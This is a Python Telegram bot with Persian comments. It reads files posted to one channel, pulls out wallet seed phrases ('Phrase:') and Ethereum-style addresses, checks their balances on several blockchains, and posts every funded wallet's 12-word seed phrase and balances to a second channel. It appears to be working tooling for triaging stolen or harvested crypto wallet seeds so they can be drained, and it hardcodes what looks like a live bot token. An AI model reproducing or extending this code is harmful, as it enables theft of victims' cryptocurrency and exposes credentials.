import os
import re
import asyncio
import threading
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
from web3 import Web3

# --- تنظیمات تلگرام ---
BOT_TOKEN = '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
SOURCE_CHANNEL_ID = '@rrxfq'    # کانال 1 (مبدأ فایل‌ها)
REPORT_CHANNEL_ID = '@regroupmywallet'  # کانال 2 (مقصد گزارش‌ها)

# لیست شبکه‌ها و RPCها
NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
    'POLYGON': 'https://polygon-rpc.com',
    'ARB': 'https://arb1.arbitrum.io/rpc',
    'OP': 'https://mainnet.optimism.io'
}

app = Flask(__name__)
@app.route('/')
def home(): return "Scanner is Running..."

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    app.run(host='0.0.0.0', port=port)

# --- تابع بررسی موجودی در تمام شبکه‌ها ---
def check_all_balances(address):
    found_assets = []
    total_in_eth_equivalent = 0 # برای محاسبات داخلی
    
    for name, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 7}))
            checksum_addr = Web3.to_checksum_address(address)
            bal_wei = w3.eth.get_balance(checksum_addr)
            
            if bal_wei > 0:
                amount = float(w3.from_wei(bal_wei, 'ether'))
                found_assets.append({'network': name, 'amount': amount})
        except: continue
    return found_assets

# --- پردازش فایل گزارش ---
async def process_report_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post or not update.channel_post.document:
        return

    doc = update.channel_post.document
    # دانلود فایل
    file = await context.bot.get_file(doc.file_id)
    content_bytes = await file.download_as_bytearray()
    content = content_bytes.decode('utf-8', errors='ignore')

    # استخراج Phrase و Addr با استفاده از الگوی فایل شما
    # الگویPhrase: (متن) و Addr: (0x...)
    phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\||\n|$)", content)
    addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)

    wallets = list(zip(phrases, addresses))
    
    if not wallets:
        print(f"❓ No wallets found in {doc.file_name}")
        return

    total_summary = {} # برای جمع کل موجودی فایل
    rich_wallets = []

    print(f"🔍 Scanning {len(wallets)} wallets from {doc.file_name}...")

    for phrase, addr in wallets:
        assets = check_all_balances(addr)
        if assets:
            rich_wallets.append({'phrase': phrase, 'addr': addr, 'assets': assets})
            for asset in assets:
                net = asset['network']
                total_summary[net] = total_summary.get(net, 0) + asset['amount']

    # --- ارسال گزارش به کانال مقصد (تلگرام 2) ---

    # 1. گزارش کلی فایل
    summary_msg = (
        f"📂 **Report for File:** `{doc.file_name}`\n"
        f"🔢 Total Wallets Scanned: {len(wallets)}\n"
        f"💰 **Total Sum of Assets:**\n"
    )
    if total_summary:
        for net, total in total_summary.items():
            summary_msg += f"   - {net}: `{total:.6f}`\n"
    else:
        summary_msg += "   - No balances found above 0."

    await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=summary_msg, parse_mode='Markdown')

    # 2. گزارش جداگانه برای هر ولت موجودی‌دار
    for w in rich_wallets:
        detail_msg = (
            f"💎 **Balance Detected!**\n\n"
            f"🔑 **12 Words:** `{w['phrase']}`\n"
            f"📍 **Address:** `{w['addr']}`\n\n"
            f"🛰 **Network Details:**\n"
        )
        for asset in w['assets']:
            detail_msg += f"   - {asset['network']}: `{asset['amount']:.6f}`\n"
            
        await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=detail_msg, parse_mode='Markdown')

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    print("🚀 Scanner Bot Started. Monitoring Channel 1...")
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # فیلتر برای دریافت داکیومنت از کانال
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL & filters.Document.ALL, process_report_file))
    
    application.run_polling()
